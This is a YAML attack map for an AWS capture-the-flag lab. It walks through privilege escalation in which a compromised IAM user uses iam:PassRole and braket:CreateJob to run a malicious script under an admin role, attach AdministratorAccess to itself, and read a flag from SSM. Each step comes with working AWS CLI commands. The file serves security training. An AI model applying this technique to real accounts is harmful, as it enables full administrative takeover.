attackMap:
  nodes:
    - id: starting-user
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-braket-001-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer,
        discovering credentials in source code or CI/CD pipelines, or exploiting a
        vulnerable workload running in this AWS account.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has iam:PassRole on the admin target role and braket:CreateJob
        permissions. Together, these allow you to create an Amazon Braket Hybrid Job
        that runs arbitrary code under the admin role and modifies IAM permissions
        on your behalf.

    - id: braket-job
      label: "Braket Hybrid Job"
      type: resource
      subType: braket-job
      arn: "arn:aws:braket:{region}:{account_id}:job/pl-prod-braket-001-to-admin-privesc-job"
      description: >
        An Amazon Braket Hybrid Job created by the attacker with a malicious Python
        script hosted in an attacker-controlled S3 bucket. The job is configured to
        run under the administrative target role, meaning any boto3 calls within the
        script execute with full admin permissions. The malicious script attaches
        AdministratorAccess to the starting user.

    - id: admin-role
      label: "Admin Role"
      type: principal
      subType: iam-role
      isAdmin: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-braket-001-to-admin-admin-role"
      description: >
        An IAM role with AdministratorAccess attached. This role trusts the Braket
        service principal (braket.amazonaws.com) and is passed to the Braket Hybrid
        Job during creation. When the job executes, it runs with the credentials of
        this role. The malicious script calls iam:AttachUserPolicy to grant the
        starting user AdministratorAccess — admin-equivalent permissions that are
        then used to read the scenario's CTF flag from SSM Parameter Store.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/braket-001-to-admin"
      description: >
        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
        Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is
        granted implicitly by AdministratorAccess). Your goal is to read this parameter
        using the admin access gained from the previous step.

  edges:
    - from: starting-user
      to: braket-job
      label: "iam:PassRole + braket:CreateJob"
      description: >
        The starting user creates an Amazon Braket Hybrid Job, passing the admin role
        as the execution role and pointing the job at a malicious Python script hosted
        in an attacker-controlled S3 bucket. The script will run iam:AttachUserPolicy
        under the admin role when the job executes.
      hints:
        - "Create a Braket Hybrid Job using braket:CreateJob, passing the admin role as --role-arn and specifying the exploit script in S3 via --algorithm-specification scriptModeConfig. The script runs boto3 to call iam:AttachUserPolicy under the admin role."
        - "The Braket bucket must start with 'amazon-braket-' for the default Braket service role policy to allow S3 access. The Terraform-deployed attacker bucket already follows this convention."
      commands:
        - description: "Create a Braket Hybrid Job passing the admin role and the malicious exploit script"
          command: >
            aws braket create-job
              --job-name pl-prod-braket-001-to-admin-privesc-job
              --role-arn arn:aws:iam::{account_id}:role/pl-prod-braket-001-to-admin-admin-role
              --algorithm-specification '{"scriptModeConfig":{"entryPoint":"exploit:main","s3Uri":"s3://{attacker_bucket}/exploit/exploit.py","compressionType":"NONE"}}'
              --output-data-config '{"s3Path":"s3://{attacker_bucket}/exploit/output"}'
              --instance-config '{"instanceType":"ml.m5.large","instanceCount":1,"volumeSizeInGb":1}'
              --device-config '{"device":"arn:aws:braket:::device/quantum-simulator/amazon/sv1"}'
              --hyper-parameters '{"ATTACKER_USER":"pl-prod-braket-001-to-admin-starting-user"}'
              --stopping-condition '{"maxRuntimeInSeconds":300}'

    - from: braket-job
      to: admin-role
      label: "assumes role + iam:AttachUserPolicy"
      description: >
        The Braket Hybrid Job assumes the admin role at execution time. All code within
        the job script runs with the permissions of this role. The Python script uses
        boto3 to attach the AdministratorAccess managed policy to the starting user,
        granting the attacker permanent admin access. Allow 3-5 minutes for the job
        container to provision and run, then wait ~15 seconds for IAM propagation.
      hints:
        - "Poll braket:GetJob on the job ARN until status is COMPLETED. Once completed, wait ~15 seconds for IAM propagation, then verify with iam:ListAttachedUserPolicies."
      commands:
        - description: "Poll job status until COMPLETED"
          command: "aws braket get-job --job-arn {job_arn} --query 'status' --output text"
        - description: "Verify AdministratorAccess is attached to the starting user"
          command: "aws iam list-attached-user-policies --user-name pl-prod-braket-001-to-admin-starting-user --query 'AttachedPolicies[*].PolicyArn' --output text"

    - from: admin-role
      to: ctf-flag
      label: "Read CTF flag"
      description: >
        With administrator-equivalent permissions now attached to the starting user,
        retrieve the scenario flag from SSM Parameter Store. AdministratorAccess grants
        ssm:GetParameter on all parameters in the account, so no additional permissions
        are needed beyond the admin access you just gained.
      hints:
        - "You now hold admin-equivalent credentials. The scenario flag is stored in an AWS service commonly used to hold configuration values and small secrets."
        - "Scenario flags live under a shared prefix in SSM Parameter Store — consider what a reasonable naming convention for this lab might look like."
        - "Use ssm:GetParameter with the full parameter name to retrieve the flag value."
      commands:
        - description: "Retrieve the CTF flag from SSM Parameter Store"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/braket-001-to-admin --query 'Parameter.Value' --output text"
